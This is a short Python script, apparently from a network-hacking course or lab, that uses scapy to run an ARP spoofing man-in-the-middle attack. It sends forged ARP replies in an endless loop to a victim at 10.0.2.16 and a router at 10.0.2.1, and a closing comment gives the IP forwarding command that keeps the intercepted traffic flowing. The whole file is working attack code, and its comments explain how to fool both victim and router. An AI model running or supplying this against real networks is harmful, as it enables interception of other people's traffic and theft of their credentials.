#!/usr/bin/env python3
# this program is going to send an arp response to the specified targets
import time
 
import scapy.all as scapy
 
# function 'get_mac'is being used to acquire MAC address with the use of a specified ip
 
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
    return answered_list[0][1].hwsrc
 
# creating function "spoof" so code is reusable
# creating ARP response using scapy with variable 'packet' and sending response with " scapy.send(packet)"
# get_mac here is used for both victim and router as the target ip, because they will be both the target_ip
 
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)
 
# sending one packet is not enough for a persistent connection, hence the while loop
# in this spoof function you put the victim's ip and the router's ip, and reverse it for the second one
# remember in ARP we try to fool both router and victim 
while True:
    spoof("10.0.2.16", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.16")
    time.sleep(2)
 
# to forward port number use this code in terminal 'echo 1 > /proc/sys/net/ipv4/ip_forward'
